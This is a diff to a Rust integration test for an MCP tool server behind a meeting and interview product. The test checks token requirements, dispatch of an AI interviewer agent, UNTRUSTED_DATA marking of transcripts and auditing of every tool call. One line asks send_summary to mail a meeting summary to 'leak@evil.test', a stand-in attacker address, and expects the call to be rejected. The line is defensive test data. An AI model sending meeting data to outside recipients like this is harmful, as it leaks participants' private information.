@@ -105,19 +105,22 @@ async fn mcp_requires_token_lists_five_tools_and_audits_every_call(pool: PgPool)
     let meeting_id = payload["meeting_id"].as_str().unwrap().to_string();
     assert!(payload["join_links"][0]["join_url"].as_str().unwrap().starts_with("https://meet.example.com/join?t=inv_"));
 
+    // Questions are optional: the interviewer writes its own from the instructions.
+    let d = mcp(&app, 6, "tools/call", json!({ "name": "dispatch_agent", "arguments": { "room_id": room, "instructions": "Designer interview" } })).await;
+    assert_eq!(d["result"]["isError"], false, "{d}");
     let d = mcp(&app, 6, "tools/call", json!({ "name": "dispatch_agent", "arguments": { "room_id": room, "instructions": "Designer interview", "questions": ["Tell me about your portfolio."] } })).await;
     assert_eq!(d["result"]["isError"], false, "{d}");
-    // The meeting is far ahead: the agent is assigned now and sent when the candidate joins.
-    assert!(d["result"]["content"][0]["text"].as_str().unwrap().contains("joins when the applicant does"), "{d}");
+    // The meeting is far ahead: the agent is assigned now and sent when someone joins.
+    assert!(d["result"]["content"][0]["text"].as_str().unwrap().contains("joins when someone joins"), "{d}");
     assert_eq!(mock.calls_to("livekit").iter().filter(|c| c.method == "dispatch_agent").count(), 0);
     let s = mcp(&app, 7, "tools/call", json!({ "name": "send_summary", "arguments": { "meeting_id": meeting_id, "recipients": ["leak@evil.test"] } })).await;
     assert_eq!(s["result"]["isError"], true, "no summary yet / outside recipient");
     let t = mcp(&app, 8, "tools/call", json!({ "name": "get_transcript", "arguments": { "meeting_id": meeting_id } })).await;
     assert!(t["result"]["content"][0]["text"].as_str().unwrap().contains("UNTRUSTED_DATA"));
 
-    // Every tools/call is audited: 1 invalid + 4 unknown + create + dispatch + send + transcript.
+    // Every tools/call is audited: 1 invalid + 4 unknown + create + 2 dispatches + send + transcript.
     let audits = mcp_audits(&pool).await;
-    assert_eq!(audits.len(), 9, "{audits:?}");
+    assert_eq!(audits.len(), 10, "{audits:?}");
     assert_eq!(audits.iter().filter(|o| *o == "invalid").count(), 5);
 }
 
